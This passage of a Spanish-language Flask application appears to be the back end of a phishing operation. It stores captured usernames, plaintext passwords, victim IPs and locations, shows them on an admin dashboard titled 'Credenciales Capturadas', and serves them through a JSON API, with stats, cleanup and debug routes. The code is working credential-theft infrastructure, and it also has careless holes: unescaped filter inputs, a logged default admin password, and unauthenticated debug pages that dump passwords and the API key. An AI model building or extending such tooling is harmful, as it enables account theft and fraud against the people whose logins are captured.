        cursor.execute(query, params)
        rows = cursor.fetchall()
        conn.close()
    except Exception as e:
        logger.error(f"Error al leer credenciales: {e}")
        return "<h1>❌ Error al cargar las credenciales</h1>"
    
    if not rows:
        return "<h1>📭 No hay credenciales capturadas aún</h1>"
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Credenciales Capturadas</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f0f2f5; padding: 20px; }
            h1 { color: #1a73e8; text-align: center; }
            .logout { float: right; background: #dc3545; color: white; padding: 8px 16px; border-radius: 4px; text-decoration: none; margin-left: 10px; }
            .logout:hover { background: #c82333; }
            .filters { background: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            .filters input { padding: 8px; margin: 5px; border: 1px solid #ddd; border-radius: 4px; width: 200px; }
            .filters button { padding: 8px 16px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
            .filters button:hover { background: #1557b0; }
            .filters .clear { background: #6c757d; }
            .filters .clear:hover { background: #5a6268; }
            table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            th { background: #1a73e8; color: white; padding: 12px; text-align: left; }
            td { padding: 10px; border-bottom: 1px solid #ddd; }
            tr:hover { background: #f5f5f5; }
            .badge { background: #4CAF50; color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px; }
            .delete-btn { background: #dc3545; color: white; border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 12px; }
            .delete-btn:hover { background: #c82333; }
        </style>
    </head>
    <body>
        <div style="display: flex; justify-content: flex-end;">
            <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
        </div>
        <h1>🔐 Credenciales Capturadas</h1>
        <p style="text-align:center; color:#666;">Total: <strong>""" + str(len(rows)) + """</strong></p>
        
        <div class="filters">
            <form method="GET" style="display: flex; flex-wrap: wrap; align-items: center; gap: 10px;">
                <input type="text" name="ip" placeholder="Filtrar por IP" value="""" + request.args.get('ip', '') + """">
                <input type="text" name="username" placeholder="Filtrar por usuario" value="""" + request.args.get('username', '') + """">
                <input type="text" name="location" placeholder="Filtrar por ubicación" value="""" + request.args.get('location', '') + """">
                <button type="submit">🔍 Filtrar</button>
                <a href="/ver-credenciales" class="clear" style="padding: 8px 16px; background: #6c757d; color: white; border: none; border-radius: 4px; text-decoration: none;">❌ Limpiar</a>
            </form>
        </div>
        
        <table>
            <tr>
                <th>#</th>
                <th>Fecha</th>
                <th>IP</th>
                <th>Ubicación</th>
                <th>Usuario</th>
                <th>Contraseña</th>
                <th>Acción</th>
            </tr>
    """
    
    for r in rows:
        html += f"""
            <tr>
                <td>{r[0]}</td>
                <td>{r[1]}</td>
                <td>{r[2]}</td>
                <td>{r[5]}</td>
                <td><strong>{r[3]}</strong></td>
                <td><span class="badge">{r[4]}</span></td>
                <td>
                    <form action="/api/credentials/{r[0]}" method="POST" style="display:inline;">
                        <input type="hidden" name="_method" value="DELETE">
                        <input type="hidden" name="confirm" value="true">
                        <button type="submit" class="delete-btn" onclick="return confirm('¿Eliminar esta credencial? Esta acción es irreversible.')">🗑️</button>
                    </form>
                </td>
            </tr>
        """
    
    html += """
        </table>
        <p style="text-align:center; margin-top:20px; color:#999; font-size:14px;">
            Actualizado: """ + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + """
        </p>
    </body>
    </html>
    """
    return html

@app.route('/api/credentials/<int:credential_id>', methods=['DELETE', 'POST'])
def delete_credential(credential_id):
    if not session.get('admin_logged'):
        audit_log('UNAUTHORIZED_DELETE', {'credential_id': credential_id})
        return jsonify({'error': 'No autorizado'}), 401
    
    ip = get_client_ip()
    
    if request.method == 'POST' and request.form.get('confirm') != 'true':
        return jsonify({'error': 'Se requiere confirmación'}), 400
    
    session.setdefault('delete_count', 0)
    if session.get('delete_count', 0) >= 20:
        audit_log('DELETE_LIMIT_EXCEEDED', {'credential_id': credential_id}, ip)
        return jsonify({'error': 'Límite de eliminaciones alcanzado'}), 429
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM credentials WHERE id = ?', (credential_id,))
        deleted = cursor.rowcount
        conn.commit()
        conn.close()
        
        if deleted:
            session['delete_count'] = session.get('delete_count', 0) + 1
            logger.info(f"Credencial {credential_id} eliminada desde IP {ip}")
            audit_log('DELETE_CREDENTIAL', {'credential_id': credential_id, 'success': True}, ip)
            return jsonify({'success': True, 'message': 'Credencial eliminada'})
        else:
            audit_log('DELETE_CREDENTIAL', {'credential_id': credential_id, 'success': False}, ip)
            return jsonify({'success': False, 'message': 'Credencial no encontrada'}), 404
    except Exception as e:
        logger.error(f"Error al eliminar credencial: {e}")
        return jsonify({'error': 'Error interno'}), 500

@app.route('/logout-credenciales')
def logout_credenciales():
    session.pop('admin_logged', None)
    logger.info("Sesión cerrada")
    audit_log('LOGOUT', {})
    return redirect('/login-credenciales')

@app.route('/api/credentials')
def api_credentials():
    key = request.headers.get('X-API-Key')
    if key != CONFIG.get('api_key'):
        logger.warning(f"Intento de acceso no autorizado a /api/credentials desde {request.remote_addr}")
        audit_log('UNAUTHORIZED_API_ACCESS', {'endpoint': '/api/credentials'})
        abort(401)
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT id, timestamp, ip, username, password, geo_location, viewed FROM credentials ORDER BY id DESC')
        rows = cursor.fetchall()
        cursor.execute('UPDATE credentials SET viewed = 1 WHERE viewed = 0')
        conn.commit()
        conn.close()
        logger.info("API /credentials consultada exitosamente")
        audit_log('API_CREDENTIALS_ACCESS', {'count': len(rows)})
    except Exception as e:
        logger.error(f"Error en API /credentials: {e}")
        return jsonify({'error': 'Error interno'}), 500
    
    return jsonify([{
        'id': r[0], 'timestamp': r[1], 'ip': r[2], 'username': r[3],
        'password': r[4], 'location': r[5], 'viewed': r[6]
    } for r in rows])

@app.route('/api/stats')
def stats():
    key = request.headers.get('X-API-Key')
    if key != CONFIG.get('api_key'):
        logger.warning(f"Intento de acceso no autorizado a /api/stats desde {request.remote_addr}")
        audit_log('UNAUTHORIZED_API_ACCESS', {'endpoint': '/api/stats'})
        abort(401)
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*), COUNT(DISTINCT ip), COUNT(CASE WHEN viewed=0 THEN 1 END) FROM credentials')
        total, unique, new = cursor.fetchone()
        conn.close()
        logger.info("API /stats consultada exitosamente")
        audit_log('API_STATS_ACCESS', {'total': total, 'unique': unique, 'new': new})
    except Exception as e:
        logger.error(f"Error en API /stats: {e}")
        return jsonify({'error': 'Error interno'}), 500
    
    return jsonify({'total': total, 'unique_ips': unique, 'new': new})

@app.route('/api/cleanup', methods=['POST'])
def api_cleanup():
    key = request.headers.get('X-API-Key')
    if key != CONFIG.get('api_key'):
        audit_log('UNAUTHORIZED_CLEANUP', {'ip': get_client_ip()})
        abort(401)
    
    ip = get_client_ip()
    days = request.args.get('days', CONFIG.get('cleanup_days', 30), type=int)
    
    if days < 1:
        return jsonify({'error': 'Los días deben ser al menos 1'}), 400
    if days > 365:
        return jsonify({'error': 'Máximo 365 días permitidos'}), 400
    
    if get_credentials_count() > 10000:
        return jsonify({'error': 'Demasiadas credenciales. Usa eliminación manual.'}), 400
    
    deleted = cleanup_old_credentials(days)
    audit_log('CLEANUP_CREDENTIALS', {'days': days, 'deleted': deleted}, ip)
    
    return jsonify({
        'deleted': deleted,
        'message': f'Eliminadas {deleted} credenciales con más de {days} días',
        'days': days
    })

@app.route('/health')
def health():
    return jsonify({
        'status': 'ok', 
        'time': datetime.now().isoformat(),
        'credentials_count': get_credentials_count()
    })

def get_credentials_count():
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM credentials')
        count = cursor.fetchone()[0]
        conn.close()
        return count
    except:
        return 0

@app.route('/debug-credenciales')
def debug_credenciales():
    """Ruta temporal para verificar la base de datos"""
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM credentials')
        count = cursor.fetchone()[0]
        conn.close()
        return f"📊 Total de credenciales: {count}"
    except Exception as e:
        return f"❌ Error: {e}"

@app.route('/db-test')
def db_test():
    """Ruta para probar la base de datos desde el navegador"""
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        
        # Ver cuántas credenciales hay
        cursor.execute('SELECT COUNT(*) FROM credentials')
        count = cursor.fetchone()[0]
        
        # Obtener las últimas 5
        cursor.execute('SELECT id, username, password, timestamp FROM credentials ORDER BY id DESC LIMIT 5')
        rows = cursor.fetchall()
        conn.close()
        
        html = f"<h1>📊 Base de datos</h1>"
        html += f"<p>Total de credenciales: <strong>{count}</strong></p>"
        
        if rows:
            html += "<h2>Últimas 5 credenciales:</h2>"
            html += "<table border='1' cellpadding='5'>"
            html += "<tr><th>ID</th><th>Usuario</th><th>Contraseña</th><th>Fecha</th></tr>"
            for r in rows:
                html += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td></tr>"
            html += "</table>"
        else:
            html += "<p>No hay credenciales en la base de datos.</p>"
        
        # Agregar un formulario para insertar manualmente
        html += """
        <h2>Insertar credencial de prueba</h2>
        <form method="POST" action="/db-insert">
            <input type="text" name="username" placeholder="Usuario" required>
            <input type="text" name="password" placeholder="Contraseña" required>
            <button type="submit">Guardar</button>
        </form>
        """
        return html
    except Exception as e:
        return f"❌ Error: {e}"

@app.route('/db-insert', methods=['POST'])
def db_insert():
    """Insertar credencial manualmente"""
    try:
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO credentials (timestamp, ip, username, password, geo_location)
            VALUES (?, ?, ?, ?, ?)
        ''', (datetime.now().isoformat(), '127.0.0.1', username, password, 'Test, Location'))
        conn.commit()
        conn.close()
        return f"✅ Credencial guardada: {username} / {password}"
    except Exception as e:
        return f"❌ Error: {e}"

@app.route('/debug-api')
def debug_api():
    """Diagnóstico de la API Key"""
    html = "<h1>🔍 Diagnóstico de API Key</h1>"
    
    # Verificar valor en CONFIG
    html += f"<p>API Key en CONFIG: <code>{CONFIG.get('api_key', 'NO DEFINIDA')}</code></p>"
    
    # Verificar variable de entorno directa
    env_key = os.environ.get('API_KEY', 'NO ENCONTRADA')
    html += f"<p>API Key en entorno: <code>{env_key}</code></p>"
    
    # Verificar si coinciden
    if CONFIG.get('api_key') == env_key:
        html += "<p style='color:green'>✅ La API Key en CONFIG coincide con la variable de entorno</p>"
    else:
        html += "<p style='color:red'>❌ ¡NO coinciden! La variable de entorno no se está cargando correctamente</p>"
    
    # Verificar la cabecera de la petición actual
    received_key = request.headers.get('X-API-Key', 'NO ENVIADA')
    html += f"<p>API Key recibida en esta petición: <code>{received_key}</code></p>"
    
    return html

if __name__ == '__main__':
    load_config()
    init_db()
    cleanup_old_credentials()
    
    port = int(os.environ.get('PORT', 8080))
    logger.info(f"Servidor iniciado en el puerto {port}")
    logger.info(f"Contraseña de administrador: {CONFIG.get('admin_password', 'triple777')}")
    logger.info(f"Límite de intentos de login: {CONFIG.get('max_login_attempts', 5)}")
    logger.info(f"Días para limpieza automática: {CONFIG.get('cleanup_days', 30)}")
    
    app.run(host='0.0.0.0', port=port, debug=False)
